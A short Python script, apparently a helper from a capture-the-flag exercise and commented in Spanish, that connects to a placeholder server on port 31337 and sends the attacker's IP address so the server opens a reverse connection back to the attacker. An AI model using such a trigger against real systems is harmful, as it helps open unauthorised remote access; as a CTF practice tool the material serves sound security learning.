# Echo Client for CtF 5
# Ejecutar : python revconn-cli.py direccion_atacante
import socket,sys

HOST = "ip.add.re.ss"    # Server forking reverse connections
PORT = 31337              # El puerto en que escucha el server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
ip_attacker = sys.argv[1]
s.send(ip_attacker)
s.close()
print('Reverse connection generated...')
